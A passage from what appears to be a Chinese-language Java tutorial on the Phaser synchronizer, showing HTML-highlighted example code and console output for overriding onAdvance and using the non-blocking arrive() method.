	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【<span class="token number">2</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">4</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish all tasks<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="人为控制Phase的终结：onAdvance">人为控制Phase的终结：onAdvance</h2>
<ol>
<li>
<p>使用方法：覆写<code>onAdvance</code>方法</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token annotation punctuation">@Override</span>
  <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">onAdvance</span><span class="token punctuation">(</span><span class="token keyword">int</span> phase<span class="token punctuation">,</span> <span class="token keyword">int</span> registeredParties<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// return registeredParties == 0; 原始写法</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> 
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><code>onAdvance </code>的返回结果直接设置为<code>returen true</code> ，则<code>arriveAndAwaitAdvance</code>不会阻塞等待所有的<code>parties</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">practice<span class="token punctuation">.</span>util<span class="token punctuation">.</span>phaser</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 人为控制phase的终结：onAdvance
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample5</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">onAdvance</span><span class="token punctuation">(</span><span class="token keyword">int</span> phase<span class="token punctuation">,</span> <span class="token keyword">int</span> registeredParties<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 无论执行情况，都默认，phase 执行结束。</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">OnAdvanceTask</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OnAdvanceTask</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">OnAdvanceTask</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser <span class="token operator">=</span> phaser<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 arrived part one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 passed part one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 arrived part two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// onAdvance 设置为true，arriveAndAwaitAdvance不会阻塞</span>
                <span class="token comment">// onAdvance 设置false/ 使用默认的onAdvance，Thread-1 会阻塞在此处</span>
                phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 passed part two"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// onAdvance 设置false/ 使用默认的onAdvance，Thread-0 会阻塞在此处</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> template <span class="token operator">=</span> <span class="token string">"\t【%s】【monitor-%d】【%30s】%s\n"</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> actionName <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getPhase"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getRegisteredParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getArrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getArrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getUnarrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getUnarrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.isTerminated"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">isTerminated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 arrived part one
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 arrived part one
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 passed part one
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 passed part one
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483647</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483647</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 arrived part two
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483647</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483647</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 passed part two
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483647</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">2</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483647</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">3</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="到达之后，不阻塞等待：arrive">到达之后，不阻塞等待：arrive</h2>
<p><code>public int arrive()</code></p>
<p>使用场景：仅==监控线程==关心任务完成，执行线程无需相互等待</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/arrive.drawio-1667231117133-89.png" alt="arrive.drawio"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @author: DH
 * @date: 2022/6/28
 * @desc:
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample6</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">ArriveTask</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 此处main线程会阻塞，等待part one全部完成</span>
        phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 part one all done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ArriveTask</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">ArriveTask</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser <span class="token operator">=</span> phaser<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSecondsRandom</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// parties 参与计数，但是不会阻塞等待</span>
            phaser<span class="token punctuation">.</span><span class="token function">arrive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 part one all done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSecondsRandom</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> template <span class="token operator">=</span> <span class="token string">"\t【%s】【monitor-%d】【%30s】%s\n"</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> actionName <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getPhase"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getRegisteredParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getArrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getArrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getUnarrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getUnarrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.isTerminated"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">isTerminated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
